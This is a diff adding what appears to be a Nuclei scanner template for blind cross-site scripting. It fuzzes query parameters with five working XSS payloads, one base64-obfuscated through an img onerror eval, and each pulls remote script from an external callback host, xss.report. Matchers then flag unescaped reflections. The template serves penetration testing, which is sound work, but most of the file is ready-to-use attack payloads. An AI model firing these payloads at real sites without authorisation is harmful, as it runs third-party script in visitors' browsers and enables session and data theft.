@@ -1,0 +1,44 @@
+id: blind-xss-strict
+
+info:
+  name: Blind XSS (Strict Verification)
+  author: ajvad
+  severity: high
+  description: Only reports if the payload is returned as EXECUTABLE HTML (unescaped).
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      blind:
+        - '"><script src=https://xss.report/c/ajvadn></script>'
+        - "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://xss.report/c/ajvadn\\';document.body.appendChild(a)')"
+        - '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FqdmFkbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>'
+        - '<script>$.getScript("//xss.report/c/ajvadn")</script>'
+        - '<svg onload="javascript:eval(''var a=document.createElement(\''script\'');a.src=\''https://xss.report/c/ajvadn\'';document.body.appendChild(a)'')" />'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{blind}}"
+
+    matchers-condition: or
+    matchers:
+      # Matcher 1: Look for exact UNESCAPED script tags
+      - type: word
+        words:
+          - "<script src=https://xss.report/c/ajvadn></script>"
+          - "\"><script src=https://xss.report/c/ajvadn>"
+          - "<script>$.getScript"
+        part: body
+
+      # Matcher 2: Look for UNESCAPED event handlers (dangerous attributes)
+      - type: word
+        words:
+          - "onerror=eval(atob(this.id))"
+          - "onload=\"javascript:eval"
+        part: body
